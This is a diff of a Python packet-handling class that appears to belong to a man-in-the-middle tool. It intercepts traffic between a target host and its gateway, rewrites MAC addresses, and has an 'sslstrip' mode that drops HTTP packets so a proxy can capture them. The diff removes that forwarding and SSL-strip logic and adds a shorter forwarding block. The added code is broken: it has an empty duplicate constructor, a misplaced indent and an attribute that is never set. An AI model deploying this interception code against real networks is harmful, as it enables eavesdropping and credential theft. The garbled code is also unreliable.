@@ -20,6 +20,8 @@ logger = logging.getLogger('PacketHandler')
 class PacketHandler:
     """fml"""
 
+    def __init__(self, interface, gateway_ip, forward_packets=True):
+
     def __init__(self, interface, gateway_ip, target_ip=None):
         self.interface = interface
         self.gateway_ip = gateway_ip
@@ -38,16 +40,6 @@ class PacketHandler:
         self.filters = []  # List of (priority, function) tuples
         self.running = False
         self.sniffer_thread = None
-
-        # Statistics
-        self.packets_forwarded = 0
-        self.packets_dropped = 0
-
-        logger.info(f"PacketHandler initialized")
-        logger.info(f"Interface: {interface}")
-        logger.info(f"Our MAC: {self.attacker_mac}")
-        logger.info(f"Gateway: {gateway_ip} ({self.gateway_mac})")
-        logger.info(f"Target: {target_ip} ({self.target_mac})")
 
     def _resolve_mac(self, ip):
         """Resolve MAC address for an IP"""
@@ -97,108 +89,19 @@ class PacketHandler:
             if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
                 return
 
-            # Let filters process the packet first
-            packet_blocked = False
-            for priority, filter_func in self.filters:
-                try:
-                    if filter_func(packet):  # Filter handled/blocked the packet
-                        packet_blocked = True
-                        logger.debug(
-                            f"Packet blocked by filter (priority {priority})")
-                        break
-                except Exception as e:
-                    logger.error(f"Filter error: {e}")
+        # MITM
+        if self.forward_packets and IP in packet:
+            try:
+                del packet[IP].chksum
+                if TCP in packet:
+                    del packet[TCP].chksum
+                if UDP in packet:
+                    del packet[UDP].chksum
 
-            # Only forward if no filter blocked it
-            if not packet_blocked:
-                self._forward_packet(packet)
-            else:
-                self.packets_dropped += 1
-
-        except Exception as e:
-            logger.error(f"Packet callback error: {e}")
-
-    def _forward_packet(self, packet):
-        """Forward packets between target and gateway"""
-        try:
-            if not packet.haslayer(Ether):
-                return
-
-            src_ip = packet[IP].src
-            dst_ip = packet[IP].dst
-
-            # Check if we should drop HTTP packets (SSL strip mode)
-            if self.mode == "sslstrip" and packet.haslayer(TCP):
-                tcp = packet[TCP]
-
-                # Drop HTTP packets - proxy will handle them
-                if tcp.dport == 80 and dst_ip != self.local_proxy_ip:
-
-                    # Only drop if it involves our target
-                    if src_ip == self.target_ip or dst_ip == self.target_ip:
-                        self.packets_dropped += 1
-                        logger.debug(
-                            f"Dropped HTTP packet (proxy mode): {src_ip}:{tcp.sport} → {dst_ip}:{tcp.dport}")
-                        return  # DONT FORWWARD
-
-            # Make a copy to avoid modifying the original
-            pkt = packet.copy()
-
-            # Clear checksums - they'll be recalculated :/
-            if pkt.haslayer(IP):
-                del pkt[IP].chksum
-                del pkt[IP].len
-            if pkt.haslayer(TCP):
-                del pkt[TCP].chksum
-            if pkt.haslayer(UDP):
-                del pkt[UDP].chksum
-
-            # Determine forwarding direction and set MACs
-            forwarded = False
-
-            # Target -> Gateway
-            if self.target_ip and src_ip == self.target_ip and dst_ip != self.gateway_ip:
-                pkt[Ether].dst = self.gateway_mac
-                pkt[Ether].src = self.attacker_mac
-                forwarded = True
-
-            # Gateway -> Target
-            elif self.target_ip and src_ip != self.target_ip and dst_ip == self.target_ip:
-                pkt[Ether].dst = self.target_mac
-                pkt[Ether].src = self.attacker_mac
-                forwarded = True
-
-            # Target -> Gateway (direct)
-            elif self.target_ip and src_ip == self.target_ip and dst_ip == self.gateway_ip:
-                pkt[Ether].dst = self.gateway_mac
-                pkt[Ether].src = self.attacker_mac
-                forwarded = True
-
-            # Gateway -> Target (direct)
-            elif self.target_ip and src_ip == self.gateway_ip and dst_ip == self.target_ip:
-                pkt[Ether].dst = self.target_mac
-                pkt[Ether].src = self.attacker_mac
-                forwarded = True
-
-            if forwarded:
-                # Send the packet
-                sendp(pkt, verbose=0, iface=self.interface)
-                self.packets_forwarded += 1
-
-                # Log interesting packets
-                if packet.haslayer(TCP):
-                    if self.mode != "sslstrip" and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
-                        logger.debug(
-                            f"HTTP: {src_ip}:{packet[TCP].sport} -> {dst_ip}:{packet[TCP].dport}")
-                    elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
-                        logger.debug(
-                            f"HTTPS: {src_ip}:{packet[TCP].sport} -> {dst_ip}:{packet[TCP].dport}")
-            else:
-                self.packets_dropped += 1
-
-        except Exception as e:
-            # Silently handle forwarding errors
-            self.packets_dropped += 1
+                packet[Ether].dst = self.gateway_mac
+                sendp(packet, verbose=0, iface=self.interface)
+            except Exception as e:
+                logger.debug(f"Error forwarding packet: {e}")
 
     def _sniffer_loop(self):
         """Main sniffer loop"""
